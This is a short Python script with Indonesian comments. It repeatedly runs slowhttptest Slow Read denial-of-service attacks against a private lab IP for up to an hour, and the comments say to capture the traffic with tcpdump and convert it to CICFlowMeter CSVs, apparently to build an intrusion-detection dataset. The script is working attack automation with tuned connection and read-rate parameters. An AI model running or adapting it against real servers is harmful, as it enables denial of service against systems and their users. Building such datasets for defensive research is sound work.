## attack 1 jam dengan attack parameter seperti di bawah ini

# slowhttptest -c <attack> -r <connections> -X -t GET -u http://192.168.100.122 -z <readrate>
# ini contoh yang aku pakai selama ini, tapi bisa diubah sesuai kebutuhan aka lebih sederhana

# Attack      : 100 (default)
# Connections : 50 (default)
# Runtime     : 300 sec
# Read Rate : 32/5
# Follow-up   : -

# Attack      : 200 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 5/1, 10/5, 15/5
# Follow-up   : -

# Attack      : 300 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 5/1, 5/1, 15/1
# Follow-up   : -

# Attack      : 500 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 10/5, 15/5
# Follow-up   : -

# Attack      : 600 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 10/5, 15/5
# Follow-up   : -

## saat attack ini jangan lupa trafficnya dicapture dengan tcpdump dan pcap taruh di /home/victim/project/data/pcap/. terserah yang mana duluan tcpdump atau attack command, yang penting capture seluruh trafficnya

## dari pcap itu langsung convert ke csv dengan cicflowmeter dan taruh di /home/victim/project/data/csv/ dengan nama file sesuai dengan nama pcapnya, misal pcapnya slowread.pcap maka csvnya jadi slowread.csv

import subprocess
import time
import sys

TARGET_URL = "http://192.168.100.122"

# Ambil durasi total dari argumen command-line, default 3600 detik (1 jam) jika tidak diberikan
if len(sys.argv) > 1:
    try:
        TOTAL_RUNTIME = int(sys.argv[1])
    except ValueError:
        print("Argumen durasi harus berupa angka (detik).")
        sys.exit(1)
else:
    TOTAL_RUNTIME = 3600

# List of attack configurations: (attack_name, total_connections, readrate_list)
# Format readrate: ["32/5"], ["5/1", "10/5", "15/5"], dst.
attack_configs = [
    ("attack_100", 50, ["32/5"]),
    ("attack_200", 50, ["5/1", "10/5", "15/5"]),
    ("attack_300", 50, ["5/1", "5/1", "15/1"]),
    ("attack_500", 50, ["10/5", "15/5"]),
    ("attack_600", 50, ["10/5", "15/5"]),
]

# Runtime per attack (detik)
RUNTIME_PER_ATTACK = 240

def run_attack(attack_name, total_connections, readrate_list, runtime):
    for readrate in readrate_list:
        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, runtime: {runtime}, readrate: {readrate}")
        attack_cmd = f"slowhttptest -c {total_connections} -r {total_connections} -X -t GET -u {TARGET_URL} -z {readrate} -l {runtime}"
        print(f"[INFO] Menjalankan: {attack_cmd}")
        subprocess.run(attack_cmd, shell=True)

if __name__ == "__main__":
    start_time = time.time()
    while True:
        for attack_name, total_connections, readrates in attack_configs:
            elapsed = time.time() - start_time
            if elapsed >= TOTAL_RUNTIME:
                print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                sys.exit(0)
            run_attack(attack_name, total_connections, readrates, RUNTIME_PER_ATTACK)